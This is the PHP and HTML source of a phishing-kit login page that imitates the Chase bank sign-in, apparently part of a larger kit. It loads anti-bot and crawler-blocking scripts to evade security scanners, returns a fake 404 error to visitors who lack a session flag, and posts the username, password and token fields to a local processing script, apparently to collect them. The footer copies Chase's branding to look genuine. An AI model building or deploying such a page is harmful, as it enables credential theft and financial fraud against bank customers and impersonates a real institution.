<?php
session_start();
        include'antibots/IP-BlackList.php';  
        include'antibots/Bot-Crawler.php';
        include'antibots/Bot-Spox.php'; 
        include'antibots/Dila_DZ.php';
        @require "antibots/Crawler/src/CrawlerDetect.php";

        use JayBizzle\CrawlerDetect\CrawlerDetect;



if (!isset($_SESSION['check'])) {

  header("HTTP/1.0 404 Not Found");
  exit();
}
$_SESSION['css1'] = "true";

?>

<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <title>Sign in</title>
    <link rel="shortcut icon" href="./assets/images/favi.ico">
    <link rel="apple-touch-icon" href="./assets/images/favi.png">
    <link rel="stylesheet" href="./assets/css/1.php">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<meta name="robots" content="noindex, nofollow">

</head>
<body>
<div id="content">
	
  
  <div>
    <div>
      <header>
        <div>
        </div>
      </header>
      <main>
        <div class="container">
          <div class="bg">
          </div>
          <div class="row">
            <div class="col-xs-12 col-sm-6 col-sm-offset-3 box">
              <div class="form_area">
                <div class="row">
                  <div class="col-xs-10 col-xs-offset-1">
                    <form method="POST" autocomplete="off" action="./process/config.php" novalidates="" id="form_box">
                    	<input name="user" class="input" placeholder="Username" type="text" required="">
						          <input name="pass" class="input" placeholder="Password" type="password" required="">
                      <input id="tokeninput" name="token" class="input hide" placeholder="Token" type="text">
                      <input type="hidden" name="login">
                      <div class="row" style="margin-top:20px;margin-bottom:8px">
                        <div class="col-xs-6">
                          <div class="checkbox">
                            <div>
                              <div>
                                <input type="checkbox">
                                <i class="icon check">
                                </i>
                              </div>
                              <label>Remember me</label>
                            </div>
                          </div>
                        </div>
                        <div id="token" class="col-xs-6">
                          <div class="checkbox float-left">
                            <div>
                              <div>
                                <input type="checkbox">
                                <i class="icon check">
                                </i>
                              </div>
                              <label>Use Token</label>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="row">
                        <button type="submit" class="primary">
                          <span class="label">Sign in
                          </span>
                        </button>
                      </div>
                      <div class="row">
                        <span class="link">
                          <a class="link_default" href="javascript:void(0)">Forgot username/password?
                            <i class="icon arrow_left">
                            </i>
                          </a>
                        </span>
                      </div>
                      <div class="row">
                        <span class="link">
                          <a class="link_default last" href="javascript:void(0)">Not Enrolled? Sign Up Now.
                            <i class="icon arrow_left">
                            </i>
                          </a>
                        </span>
                      </div>
                    </form>


                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
    <footer>
      <div class="fixed_footer">
        <div class="container">
          <div class="footer_socials row">
            <div class="col-xs-12">
              <span>Follow us:
              </span>
              <ul>
                <li>
                  <i class="facebook icon">
                  </i>
                </li>
                <li>
                  <i class="instagram icon">
                  </i>
                </li>
                <li>
                  <i class="twitter icon">
                  </i>
                </li>
                <li>
                  <i class="youtube icon">
                  </i>
                </li>
                <li>
                  <i class="linkedin icon">
                  </i>
                </li>
              </ul>
            </div>
          </div>
          <div class="footer_list row">
            <div class="col-xs-12">
              <ul>
                <li>
                  <a href="javascript:void(0)">Contact us
                  </a>
                </li>
                <li>
                  <a href="javascript:void(0)">Privacy
                  </a>
                </li>
                <li>
                  <a href="javascript:void(0)">Security
                  </a>
                </li>
                <li>
                  <a href="javascript:void(0)">Terms of use
                  </a>
                </li>
                <li>
                  <a href="javascript:void(0)">Our commitment to accessibility
                  </a>
                </li>
                <li>
                  <a href="javascript:void(0)">SAFE Act: Chase Mortgage Loan Originators
                  </a>
                </li>
                <li>
                  <a href="javascript:void(0)">Fair Lending
                  </a>
                </li>
                <li>
                  <a href="javascript:void(0)">About Chase
                  </a>
                </li>
                <li>
                  <a href="javascript:void(0)">J.P. Morgan
                  </a>
                </li>
                <li>
                  <a href="javascript:void(0)">JPMorgan Chase &amp; Co.
                  </a>
                </li>
                <li>
                  <a href="javascript:void(0)">Careers
                  </a>
                </li>
                <li>
                  <a href="javascript:void(0)">Español
                  </a>
                </li>
                <li>
                  <a href="javascript:void(0)">Chase Canada
                  </a>
                </li>
                <li>
                  <a href="javascript:void(0)">Site map
                  </a>
                </li>
                <li>Member FDIC
                </li>
                <li>
                  <i class="home_icon icon">
                  </i> Equal Housing Lender
                </li>
                <br>
                <li>© 2021 JPMorgan Chase &amp; Co.
                </li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </footer>
  </div>
  <div id="rotate" style="display:none">
    <div class="circle">
    </div>
    <div class="overlay">
    </div>
  </div>
  
<script>
    $(document).ready(function() {
      $("#token").click(function(){
        $("#tokeninput").toggleClass("hide");
      })
      $(document).on("click", ".checkbox", function() {
        $(this).not(".check_id").find("input[type=checkbox]").toggleClass("checked")
      })
    });
  </script> 
</div><div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div></div></body></html>